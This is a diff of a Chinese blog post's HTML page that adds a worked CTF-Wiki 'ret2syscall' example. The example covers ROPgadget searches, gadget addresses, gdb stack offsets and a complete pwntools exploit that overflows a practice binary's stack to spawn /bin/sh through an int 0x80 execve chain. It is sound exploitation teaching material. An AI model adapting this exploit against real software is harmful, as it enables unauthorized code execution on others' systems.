@@ -22,7 +22,7 @@
   
 
 <title>
-  Ret2syscall(未完成) | Cyzrjz
+  Ret2syscall | Cyzrjz
 </title>
 <meta
   name="description"
@@ -114,7 +114,7 @@
 
 
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="Ret2syscall(未完成) | Cyzrjz" />
+  <meta property="og:title" content="Ret2syscall | Cyzrjz" />
   <meta
     property="og:description"
     content="少女祈祷中..."
@@ -132,7 +132,7 @@
   <meta property="article:published_time" content="2025-04-19T22:06:54&#43;08:00" />
   <meta property="article:modified_time" content="2025-04-19T22:06:54&#43;08:00" />
   
-    <meta property="article:tag" content="pwn" />
+    <meta property="article:tag" content="pwn基础理论" />
   
   
   <meta name="twitter:card" content="summary" />
@@ -341,7 +341,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="Ret2syscall(未完成)">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="Ret2syscall">
         
       
     
@@ -357,7 +357,7 @@
   
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">Ret2syscall(未完成)</h1>
+            <h1 data-aos="slide-up">Ret2syscall</h1>
           </a>
         
       
@@ -403,6 +403,11 @@
         <li><a href="#构造rop链">构造ROP链</a></li>
       </ul>
     </li>
+    <li><a href="#举例">举例</a>
+      <ul>
+        <li><a href="#ctf-wiki-ret2syscall">CTF-Wiki-ret2syscall</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -434,7 +439,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">6</div>
+    <div class="sidebar-state-number">7</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -651,10 +656,58 @@ gadget
 </span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>
 </span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>
 </span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mh">0x80</span> <span class="c1">; 调用系统调用</span>
-</span></span></code></pre></div><p>利用ROPgadget找到</p>
+</span></span></code></pre></div><h2 id="举例">
+<a class="header-anchor" href="#%e4%b8%be%e4%be%8b"></a>
+举例
+</h2><h3 id="ctf-wiki-ret2syscall">
+<a class="header-anchor" href="#ctf-wiki-ret2syscall"></a>
+CTF-Wiki-ret2syscall
+</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
+<p>利用ROPgadget分别用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary rop --only <span class="s1">&#39;pop|ret&#39;</span>
+</span></span><span class="line"><span class="cl">ROPgadget --binary rop --string <span class="s1">&#39;/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">ROPgadget --binary rop --only <span class="s1">&#39;int&#39;</span> <span class="c1">#系统调用</span>
+</span></span></code></pre></div><p>找到</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0806eb90</span> <span class="p">:</span> <span class="nv">pop</span> <span class="nb">edx</span> <span class="c1">; pop ecx ; pop ebx ; ret</span>
 </span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x080bb196</span> <span class="p">:</span> <span class="nv">pop</span> <span class="nb">eax</span> <span class="c1">; ret</span>
-</span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x08049421</span> <span class="p">:</span> <span class="nv">int</span> <span class="mh">0x80</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x080be408</span> <span class="p">:</span> <span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>
+</span></span></code></pre></div><p>gdb调试程序,找到栈溢出点
+输入废物数据填充缓冲区,找到字符串开始的地方和ebp的地方分别为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffcabc</span> <span class="c1">;开始填充</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffcb28</span> <span class="c1">;ebp</span>
+</span></span></code></pre></div><p><img src="/post/ret2syscall/img/image-2.png" alt="alt text"></p>
+<ul>
+<li><strong>构造exploit</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span> <span class="c1">#设置架构</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 找到gadget</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x080be408</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">构造payload
+</span></span></span><span class="line"><span class="cl"><span class="s1">使用flat自动地将多种类型的输入（整数、字符串、字节串、嵌套列表等）“打平”并按上下文（字长、大小端）正确地打包成一个连续的 bytes 对象，省去了手动 p32()/p64()、拼接和填充的繁琐步骤
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span><span class="p">(</span><span class="mh">0xffffcb28</span> <span class="o">-</span> <span class="mh">0xffffcabc</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_eax_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xb</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_edx_ecx_ebx_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bin_sh</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">int_0x80</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1">#进入交互模式</span>
+</span></span></code></pre></div><p>成功打通
+<img src="/post/ret2syscall/img/image-3.png" alt="alt text"></p>
+
       
     </div>
     <footer class="article-footer">
@@ -684,6 +737,15 @@ gadget
       >
     </li>
   
+    <li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/%e5%9f%ba%e7%a1%80%e7%90%86%e8%ae%ba"
+        rel="tag"
+        >基础理论</a
+      >
+    </li>
+  
 </ul>
 
     </footer>
@@ -700,7 +762,7 @@ gadget
           
           
             <img
-              data-src="/images/my/4.jpg"
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
               data-sizes="auto"
               alt="Ret2libc(未完成)"
               class="lazyload"
@@ -792,7 +854,7 @@ gadget
       <div>
         <span class="icon-brush"
           >&nbsp;
-            6.4k
+            6.7k
           </span
         >
         &nbsp;|&nbsp;
@@ -800,7 +862,7 @@ gadget
           
           
 
-          00:14
+          00:15
         </span>
       </div>
     
@@ -855,6 +917,11 @@ gadget
         <li><a href="#构造rop链">构造ROP链</a></li>
       </ul>
     </li>
+    <li><a href="#举例">举例</a>
+      <ul>
+        <li><a href="#ctf-wiki-ret2syscall">CTF-Wiki-ret2syscall</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -886,7 +953,7 @@ gadget
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">6</div>
+    <div class="sidebar-state-number">7</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -1249,7 +1316,7 @@ gadget
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cyzrjz",
-          title: "Ret2syscall(未完成)",
+          title: "Ret2syscall",
           url: "https:\/\/cyzrjz.github.io\/post\/ret2syscall\/",
           description: " 前置知识 假设有以下程序\n#include \u0026lt;stdio.h\u0026gt; char shellcode[0x100] = \u0026#34;hello world\u0026#34;; my_puts(){ write(1, shellcode, 0x100); } int main(){ my_puts(); return 0; } 代码很简单,就是输出字符串\u0026quot;hello world\u0026quot; 但这一串代码在操作系统层面如何实现?\nflowchart LR A[\u0022my_puts()\u0022] --\u003e B[\u0022write()\u0022] --\u003e C[\u0022sys_write()\u0022] --\u003e D[\u0022标准输出\u0022] …",
           cover: "https:\/\/cyzrjz.github.io\/images\/banner.webp",
